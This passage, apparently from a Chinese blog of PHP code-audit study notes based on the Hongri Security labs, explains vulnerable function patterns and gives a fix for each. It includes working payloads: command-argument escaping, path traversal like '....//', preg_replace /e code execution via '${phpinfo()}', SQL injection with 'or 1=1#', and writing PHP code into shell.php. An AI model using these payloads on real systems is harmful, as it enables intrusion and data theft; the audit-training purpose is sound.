class="code"><pre><span class="line">\\<span class="string">&#x27;&#x27;</span>  <span class="comment">#从之前的\&#x27; 变成 \\&#x27; 这回是反斜线被转义了 所以单引号是多出来的正好与之前的第三部分的第一个单引号配对了</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v -d a=<span class="number">1</span>\<span class="string">&#x27; #因为第二部分配对了 导致第三部分的单引号多余了 所以根据函数规则 未匹配的单引号会加上反斜线转义</span></span><br></pre></td></tr></table></figure><h4 id="利用场景：-4"><a href="#利用场景：-4" class="headerlink" title="利用场景："></a>利用场景：</h4><p>参数逃逸导致远程代码执行</p><p>ctf也有遇到过</p><h4 id="修复建议：-4"><a href="#修复建议：-4" class="headerlink" title="修复建议："></a>修复建议：</h4><p>不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤</p><h3 id="正则使用不当导致的路径穿越问题"><a href="#正则使用不当导致的路径穿越问题" class="headerlink" title="正则使用不当导致的路径穿越问题"></a>正则使用不当导致的路径穿越问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day6/files/README.md">红日安全]代码审计Day6 - 正则使用不当导致的路径穿越问题</a></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功将其替换成 <strong>replacement</strong> 。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204230021968.png"></p><p>本质上是对正则表达式的绕过</p><p><strong>preg_replace</strong> 中的 <strong>pattern</strong> 部分 ，该正则表达式并未起到过滤目录路径字符的作用。<code>[^a-z.-_]</code>  表示匹配除了 <strong>a</strong> 字符到 <strong>z</strong> 字符、**.** 字符到 <strong>_</strong> 字符之间的所有字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../ config.php</span><br></pre></td></tr></table></figure><p>即可删除config.php文件</p><h4 id="利用场景：-5"><a href="#利用场景：-5" class="headerlink" title="利用场景："></a>利用场景：</h4><p>本质是对正则的绕过，只要正则写的不完善，都可以进行绕过尝试。</p><p>CTF中也有出现过。</p><h4 id="修复建议：-5"><a href="#修复建议：-5" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合业务修改完善正则表达式。</p><h3 id="parse-str函数缺陷"><a href="#parse-str函数缺陷" class="headerlink" title="parse_str函数缺陷"></a>parse_str函数缺陷</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day7/files/README.md">红日安全]代码审计Day7 - parse_str函数缺陷</a></p><p>这个函数的缺陷实际上导致的是一个<strong>变量覆盖</strong>漏洞。</p><blockquote><p><a href="http://php.net/manual/zh/function.parse-str.php"> <strong>parse_str</strong> </a></p><p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p><p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p><p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204230119878.png"></p><h4 id="利用场景：-6"><a href="#利用场景：-6" class="headerlink" title="利用场景："></a>利用场景：</h4><p>白盒审计</p><p>ctf遇到过</p><h4 id="修复建议：-6"><a href="#修复建议：-6" class="headerlink" title="修复建议："></a>修复建议：</h4><p>在注册变量前先判断变量是否存在</p><h3 id="preg-replace函数之命令执行"><a href="#preg-replace函数之命令执行" class="headerlink" title="preg_replace函数之命令执行"></a>preg_replace函数之命令执行</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md">红日安全]代码审计Day8 - preg_replace函数之命令执行</a></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p></blockquote><ul><li><strong>$pattern</strong> 存在 <strong>&#x2F;e</strong> 模式修正符，允许代码执行</li><li><strong>&#x2F;e</strong> 模式修正符，是 **preg_replace() ** 将 <strong>$replacement</strong> 当做php代码来执行</li></ul><p>总结就是 php5.5版本以下，<strong>preg_replace</strong>函数有一个&#x2F;e模式，开启了就会导致代码执行。</p><p><strong>经典问题案例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span>(<span class="params"> <span class="variable">$regex</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>. <span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complexStrtolower</span>(<span class="variable">$regex</span>, <span class="variable">$value</span>).<span class="string">&quot;n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replace 使用了 &#x2F;e 模式，导致可以代码执行，我们可以控制第一个和第三个参数，第二个参数固定为 ‘strtolower(“\1”)’ 字符串。</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong></p><p>如何进行命令执行其他恶意代码？</p><p>这里要用到一个PHP的小<strong>trick</strong>，<strong>反向引用</strong>。</p><p>看了几篇文章，感觉讲的不是很清楚，这里解释一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，</span><br><span class="line">所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。</span><br><span class="line">缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 <span class="string">&#x27;\n&#x27;</span> 访问，</span><br><span class="line">其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">camelize</span>(<span class="params"><span class="variable">$word</span></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(^|_)([a-z])/e&#x27;</span>, <span class="string">&#x27;strtoupper(&quot;\2&quot;)&#x27;</span>, <span class="variable">$word</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码，就是捕获匹配的 <code>(^|_)</code> 和 <code>([a-z])</code> 部分。它们从 1 开始编号，因此您有反向引用 1 和 2。</p><p>1是正则  **(^|_) ** 所匹配到的东西，2是  <strong>([a-z])</strong>  所匹配到的东西。这里还有一个隐藏点 <strong>0 是整个匹配的字符串</strong> 很多文章没讲到这个。</p><p>回到上面的代码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>. <span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>,<span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p>第二个参数中的\\1，实际上就是\1，配合反向引用的规则，\1就是指第一个子匹配项。</p><p>那上面的命令执行，就相当于 <strong>eval(‘strtolower(“满足正则表达式的$value”);’)</strong></p><p>官方 <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong></p><p><strong>.</strong>* 正则匹配任意多个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">变成了语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;);</span><br></pre></td></tr></table></figure><p>但是这个payload是有问题的</p><p>以**.<em><strong>作为参数名是非法的，会自动转化成</strong>_</em>**</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231609346.png"></p><p>图片来自：<a href="https://www.cnblogs.com/HelloCTF/p/13184476.html">https://www.cnblogs.com/HelloCTF/p/13184476.html</a></p><p>稍微修改以下payload即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=<span class="variable">$&#123;phpinfo()&#125;</span></span><br></pre></td></tr></table></figure><p><strong>\S</strong>* 正则匹配任意多个非空白符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`\C`、`\D`、`\H`、`\N`、`\S`、`\V`、`\X` 都能代替</span><br></pre></td></tr></table></figure><p>匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a=$a&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=hello </span><br><span class="line">a=<span class="variable">$a</span></span><br></pre></td></tr></table></figure><p>为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。</p><h4 id="利用场景：-7"><a href="#利用场景：-7" class="headerlink" title="利用场景："></a>利用场景：</h4><p>PHP版本有限制，可能见到的机会不多。</p><p>ctf出现过作为考点的题目</p><h4 id="修复建议：-7"><a href="#修复建议：-7" class="headerlink" title="修复建议："></a>修复建议：</h4><p>避免使用 <strong>&#x2F;e</strong> 模式修正符</p><h3 id="str-replace函数过滤不当"><a href="#str-replace函数过滤不当" class="headerlink" title="str_replace函数过滤不当"></a>str_replace函数过滤不当</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day9/files/README.md">红日安全]代码审计Day9 - str_replace函数过滤不当</a></p><blockquote><p><a href="http://php.net/manual/zh/function.str-replace.php"> str_replace </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：子字符串替换</p><p><strong>定义</strong> ： <code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</code></p><p>该函数返回一个字符串或者数组。如下：</p><p>str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。</p><p>str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。</p><p>str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。</p></blockquote><p>本质是过滤不严谨</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231919587.png"></p><p>以上代码是将 <strong>..&#x2F;</strong> 字符替换成空，然后进行路径拼接</p><p>payload：**….&#x2F;&#x2F;** 或者 <strong>…&#x2F;.&#x2F;</strong> ，在经过程序的 <strong>str_replace</strong> 函数处理后，都会变成 <strong>..&#x2F;</strong> </p><h4 id="利用场景：-8"><a href="#利用场景：-8" class="headerlink" title="利用场景："></a>利用场景：</h4><p>任意文件读取，任意文件删除……</p><h4 id="修复建议：-8"><a href="#修复建议：-8" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合业务场景进行过滤</p><h3 id="程序未恰当exit导致的问题"><a href="#程序未恰当exit导致的问题" class="headerlink" title="程序未恰当exit导致的问题"></a>程序未恰当exit导致的问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day10/files/README.md">红日安全]代码审计Day10 - 程序未恰当exit导致的问题</a></p><p>本质上代码逻辑有问题，在本应该立即exit退出的地方，没有退出函数，使得程序继续运行，出现非预期的情况。</p><h4 id="利用场景：-9"><a href="#利用场景：-9" class="headerlink" title="利用场景："></a>利用场景：</h4><p>重装漏洞</p><h4 id="修复建议：-9"><a href="#修复建议：-9" class="headerlink" title="修复建议："></a>修复建议：</h4><p>在正确的地方退出程序即可，使用 <strong>die</strong> 、 <strong>exit</strong> 等函数。</p><h3 id="unserialize反序列化漏洞"><a href="#unserialize反序列化漏洞" class="headerlink" title="unserialize反序列化漏洞"></a>unserialize反序列化漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day11/files/README.md">红日安全]代码审计Day11 - unserialize反序列化漏洞</a></p><p>这个可以说是打ctf之前经常能见到。</p><p>这里直接推几篇文章</p><p>这一篇就够了</p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p><h4 id="利用场景：-10"><a href="#利用场景：-10" class="headerlink" title="利用场景："></a>利用场景：</h4><p>构造POP链rce</p><p>ctf</p><h4 id="修复建议：-10"><a href="#修复建议：-10" class="headerlink" title="修复建议："></a>修复建议：</h4><p>不要把用户的输入或者是用户可控的参数值直接放进反序列化的操作中</p><h3 id="误用htmlentities函数引发的漏洞"><a href="#误用htmlentities函数引发的漏洞" class="headerlink" title="误用htmlentities函数引发的漏洞"></a>误用htmlentities函数引发的漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day12/files/README.md">红日安全]代码审计Day12 - 误用htmlentities函数引发的漏洞</a></p><blockquote><p><a href="http://php.net/manual/zh/function.htmlentities.php">htmlentities</a> — 将字符转换为 HTML 转义字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">htmlentities</span> ( <span class="keyword">string</span> <span class="variable">$string</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_COMPAT | ENT_HTML401 [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_charset&quot;</span>) [, <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span> ]]] )</span><br></pre></td></tr></table></figure><p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 htmlentities()。</p></blockquote><p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p><ul><li>ENT_COMPAT（默认值）：只转换双引号。</li><li>ENT_QUOTES：两种引号都转换。</li><li>ENT_NOQUOTES：两种引号都不转换。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231947807.png"></p><h4 id="利用场景：-11"><a href="#利用场景：-11" class="headerlink" title="利用场景："></a>利用场景：</h4><p>当参数没设置清楚会导致出现SQL注入、XSS。</p><h4 id="修复建议：-11"><a href="#修复建议：-11" class="headerlink" title="修复建议："></a>修复建议：</h4><p><strong>htmlentities</strong> 这个函数使用的时候，尽量加上可选参数，并且选择 <strong>ENT_QUOTES</strong> 转换单引号和双引号 参数。</p><h3 id="特定场合下addslashes函数的绕过"><a href="#特定场合下addslashes函数的绕过" class="headerlink" title="特定场合下addslashes函数的绕过"></a>特定场合下addslashes函数的绕过</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day13/files/README.md">红日安全]代码审计Day13 - 特定场合下addslashes函数的绕过</a></p><blockquote><p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> addslashes ( <span class="built_in">string</span> $str )</span><br></pre></td></tr></table></figure><p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NULL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231952107.png"></p><p>具体案例：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231956690.png"></p><p>代码 <strong>第33行</strong> ，通过 <strong>POST</strong> 方式传入 <strong>user</strong> 和 <strong>passwd</strong> 两个参数，通过 <strong>isValid()</strong> 来判断登陆是否合法。我们跟进一下 <strong>isValid()</strong> 这个函数，该函数主要功能代码在 <strong>第12行-第22行</strong> ，我们看到 <strong>13行</strong> 和 <strong>14行</strong> 调用 <strong>sanitizeInput()</strong> 针对 <strong>user</strong> 和 <strong>password</strong> 进行相关处理。</p><p>跟进一下 <strong>sanitizeInput()</strong> ，主要功能代码在 <strong>第24行-第29行</strong> ，这里针对输入的数据调用 <strong>addslashes</strong> 函数进行处理，然后再针对处理后的内容进行长度的判断，如果长度大于20，就只截取前20个字符。</p><p>滤了单引号，正常情况下是没有注入了，那为什么还能导致注入了，原因实际上出在了 <strong>substr</strong> 函数</p><blockquote><p><a href="http://php.net/manual/zh/function.substr.php">substr</a> — 返回字符串的子串</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> substr ( <span class="built_in">string</span> $string , <span class="built_in">int</span> $start [, <span class="built_in">int</span> $length ] )</span><br></pre></td></tr></table></figure><p>作用：返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p></blockquote><p>代码中length默认为20</p><p>我们里可以用他默认的长度为20，设计一个payload</p><p>正常情况输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>会被转换成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>但是经过substr函数的截取</p><p>又变成了</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span><span class="operator">=</span><span class="number">1234567890123456789</span>\</span><br></pre></td></tr></table></figure><p>再结合具体代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user u where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="variable">$pass</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>\将本来是用来闭合user的单引号转义成了正常的单引号，所以签名的单引号与$pass的前一个单引号进行了闭合。</p><p>这里我们让 <strong>pass&#x3D;or 1&#x3D;1#</strong> ，那么最后的sql语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p>sql注入成功。</p><h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景:"></a>利用场景:</h4><p>白盒审计</p><p>ctf</p><h4 id="修复建议：-12"><a href="#修复建议：-12" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合程序逻辑进行代码优化。</p><h3 id="从变量覆盖到getshell"><a href="#从变量覆盖到getshell" class="headerlink" title="从变量覆盖到getshell"></a>从变量覆盖到getshell</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day14/files/README.md">红日安全]代码审计Day14 - 从变量覆盖到getshell</a></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232044601.png"></p><p>在 <strong>第10-11行</strong> 处， <strong>Carrot</strong> 类的构造方法将超全局数组 <strong>$_GET</strong> 进行变量注册，这样即可覆盖 <strong>第8行</strong> 已定义的 <strong>$this-&gt;</strong> 变量。而在 <strong>第16行</strong> 处的析构函数中， <strong>file_put_contents</strong> 函数的第一个参数又是由 <strong>$this-&gt;</strong> 变量拼接的，这就导致我们可以控制写入文件的位置，最终造成任意文件写入问题。下面我们试着使用 <strong>payload</strong> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../<span class="keyword">var</span>/www/html/shell.php&amp;shell=<span class="string">&#x27;,)%0a&lt;?php phpinfo();?&gt;//</span></span><br></pre></td></tr></table></figure><p>shell.php文件中内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;../var/www/html/shell.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lost&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;bought&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span> =&gt; <span class="string">&#x27;\&#x27;,)</span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;//&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里注意，shell变量中的反斜杠\是自动加上的，是给我们传入shell参数的内容中的单引号转义的。</p><h4 id="利用场景：-12"><a href="#利用场景：-12" class="headerlink" title="利用场景："></a>利用场景：</h4><p>变脸覆盖的场景有写shell还有覆盖session登录等等</p><h4 id="修复建议：-13"><a href="#修复建议：-13" class="headerlink" title="修复建议："></a>修复建议：</h4><p>检测变量名是否为PHP原有的超全局数组，如果是则直接退出并告知变量不允许</p><h3 id="SERVER-‘PHP-SELF’-导致的防御失效问题"><a href="#SERVER-‘PHP-SELF’-导致的防御失效问题" class="headerlink" title="$_SERVER[‘PHP_SELF’]导致的防御失效问题"></a>$_SERVER[‘PHP_SELF’]导致的防御失效问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day15/files/README.md">红日安全]代码审计Day15 - $_SERVER[‘PHP_SELF’]导致的防御失效问题</a></p><p>PHP自带的**$_SERVER[‘PHP_SELF’]** 参数是可以控制</p><p><strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：<a href="http://www.test.com/redict/index.php%EF%BC%8C%E9%82%A3%E4%B9%88**PHP_SELF**%E5%B0%B1%E6%98%AF">http://www.test.com/redict/index.php，那么**PHP_SELF**就是</a> &#x2F;redict&#x2F;index.php 。</p><p>但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：<a href="http://www.test.com/redict/index.php/admin%EF%BC%8C%E9%82%A3%E4%B9%88**PHP_SELF**%E5%B0%B1%E6%98%AF/redict/index.php/admin">http://www.test.com/redict/index.php/admin，那么**PHP_SELF**就是/redict/index.php/admin</a> 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p><h4 id="利用场景：-13"><a href="#利用场景：-13" class="headerlink" title="利用场景："></a>利用场景：</h4><p>任意URL跳转</p><p>有一个关于 <strong>360webscan</strong> 的防护脚本一个历史漏洞，正是使用了 <strong>$_SERVER[‘PHP_SELF’]</strong> 这个变量，导致可以绕过360webscan防护脚本的防护，脚本的防护效果失效。</p><h4 id="修复建议：-14"><a href="#修复建议：-14" class="headerlink" title="修复建议："></a>修复建议：</h4><p>使用 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 代替即可</p><h3 id="深入理解-REQUESTS数组"><a href="#深入理解-REQUESTS数组" class="headerlink" title="深入理解$_REQUESTS数组"></a>深入理解$_REQUESTS数组</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day16/files/README.md">红日安全]代码审计Day16 - 深入理解$_REQUESTS数组</a></p><p>超全局数组 <strong>$_REQUEST</strong> 中的数据，是 <strong>$_GET</strong> 、 <strong>$_POST</strong> 、 <strong>$_COOKIE</strong> 的合集，而且数据是复制过去的，并不是引用。</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232129558.png"></p><p>所以很多时候仅仅是对**$_GET** 、 <strong>$_POST</strong>的传参做了限制，但利用时的变量确实使用**$_REQUEST**传入的，相当于并没有进行过滤。</p><h4 id="利用场景：-14"><a href="#利用场景：-14" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XSS，SQL注入等</p><h4 id="修复建议：-15"><a href="#修复建议：-15" class="headerlink" title="修复建议："></a><strong>修复建议：</strong></h4><p>优化参数处理逻辑。</p><h3 id="Raw-MD5-Hash引发的注入"><a href="#Raw-MD5-Hash引发的注入" class="headerlink" title="Raw MD5 Hash引发的注入"></a>Raw MD5 Hash引发的注入</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day17/files/README.md">红日安全]代码审计Day17 - Raw MD5 Hash引发的注入</a></p><blockquote><p><a href="http://php.net/manual/zh/function.md5.php">md5</a> — 计算字符串的 MD5 散列值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">md5</span> ( <span class="keyword">string</span> <span class="variable">$str</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure><p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232133969.png"></p><p>案例：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232134254.png"></p><p>我可以控制的点有两个变量，一个是 <strong>$user</strong> ，一个是 <strong>$pass</strong> ，**$pass** 经过了 <strong>md5</strong> 的处理，但是返回字段不是标准的md5值，**$user** 经过了 <strong>addslashes</strong> 函数的处理，无法引入特殊符号去闭合。</p><p>如果我们经过 <strong>$pass &#x3D; md5($this-&gt;password, true);</strong> 处理之后的值逃逸出一个反斜杆，那么实际上带入到数据库的值就如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span 